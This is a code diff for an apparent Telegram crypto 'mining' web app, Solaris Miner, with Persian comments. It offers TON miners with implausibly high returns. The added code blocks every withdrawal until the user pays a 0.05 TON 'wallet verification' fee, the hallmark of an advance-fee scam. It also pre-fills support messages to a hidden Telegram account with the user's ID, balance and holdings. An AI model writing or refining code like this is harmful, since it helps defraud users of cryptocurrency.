@@ -135,7 +135,7 @@
             backdrop-filter: blur(6px);
         }
 
-        /* پس‌زمینه حرارتی خورشیدی مشابه عکس دوم */
+        /* پس‌زمینه حرارتی خورشیدی */
         .space-mining-card {
             position: relative;
             background: linear-gradient(rgba(28, 10, 0, 0.75), rgba(45, 18, 0, 0.85)), url('https://images.unsplash.com/photo-1614728894747-a83421e2b9c9?auto=format&fit=crop&w=800&q=80') center/cover no-repeat;
@@ -204,7 +204,7 @@
             box-shadow: 0 0 25px rgba(16, 185, 129, 0.2);
         }
 
-        /* مانیتور دیجیتالی هالی‌لودی */
+        /* مانیتور دیجیتالی */
         .hollyland-monitor-box {
             position: relative;
             width: 100%;
@@ -1062,7 +1062,6 @@
             }
         }
 
-        // لیست ۱۲ تایی ماینرها بدون برچسب عددی روی کارت‌ها
         const initialProperties = [
             { id: 1, name: "Solaris Alpha", desc: "Compact entry-level mining unit", daily: 0.10, monthly: 3.00, price: 0.10 },
             { id: 2, name: "Solaris Quantum", desc: "Single-board residential setup", daily: 0.66, monthly: 19.80, price: 3.00 },
@@ -1099,7 +1098,7 @@
         };
 
         function loadState() {
-            const saved = localStorage.getItem('solaris_miner_save_v57');
+            const saved = localStorage.getItem('solaris_miner_save_v59');
             if (saved) {
                 try { state = JSON.parse(saved); } catch(e) {}
             }
@@ -1129,7 +1128,7 @@
 
         function saveState() {
             state.lastTick = Date.now();
-            localStorage.setItem('solaris_miner_save_v57', JSON.stringify(state));
+            localStorage.setItem('solaris_miner_save_v59', JSON.stringify(state));
         }
 
         function getTotalDailyRate() {
@@ -1297,6 +1296,13 @@
         }
 
         function processWithdraw() {
+            // 🛑 شرط جدید: بررسی تایید ولت با پرداخت ۰.۰۵ تون قبل از اجازه برداشت
+            if (!state.isVerifiedWallet) {
+                alert("⚠️ لطفاً ابتدا با زدن دکمه Verify Wallet (0.05 TON) ولت خود را تایید کنید تا بتوانید برداشت انجام دهید!");
+                closeModal('withdraw-modal');
+                return;
+            }
+
             const amount = parseFloat(document.getElementById('withdraw-amount').value) || 0;
             const address = document.getElementById('withdraw-address').value;
 
@@ -1401,8 +1407,38 @@
             document.getElementById('nav-' + tabName).classList.add('active');
         }
 
+        // تابع هوشمند ارتباط با پشتیبانی (ارسال خودکار مشخصات، موجودی و ماینرهای کاربر به پیوی شما بدون نمایش آیدی روی صفحه)
         function openSupportChat() {
-            window.open("https://t.me/" + supportTelegramId, "_blank");
+            const supportUsername = "Dollar_Matrix";
+            
+            const userId = state.telegramId || "نامشخص";
+            const userName = state.userName || "کاربر";
+            const balance = state.balance.toFixed(4) + " TON";
+            const activeMinersCount = state.ownedIds.length;
+            
+            const ownedNames = initialProperties
+                .filter(p => state.ownedIds.includes(p.id))
+                .map(p => p.name)
+                .join(", ");
+
+            const supportText = encodeURIComponent(
+                `سلام پشتیبانی سولاریس ماینر 👋\n\n` +
+                `📋 مشخصات اکانت من:\n` +
+                `👤 نام: ${userName}\n` +
+                `🆔 آیدی عددی: ${userId}\n` +
+                `💰 موجودی حساب: ${balance}\n` +
+                `⚡ تعداد ماینرهای فعال: ${activeMinersCount} از ۱۲\n` +
+                `🛠️ دستگاه‌های فعال: ${ownedNames || 'هیچ‌کدام'}\n\n` +
+                `❓ سوال / درخواست من:`
+            );
+
+            const telegramUrl = `https://t.me/${supportUsername}?text=${supportText}`;
+            
+            if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.openTelegramLink) {
+                window.Telegram.WebApp.openTelegramLink(telegramUrl);
+            } else {
+                window.open(telegramUrl, "_blank");
+            }
         }
     </script>
 </body>
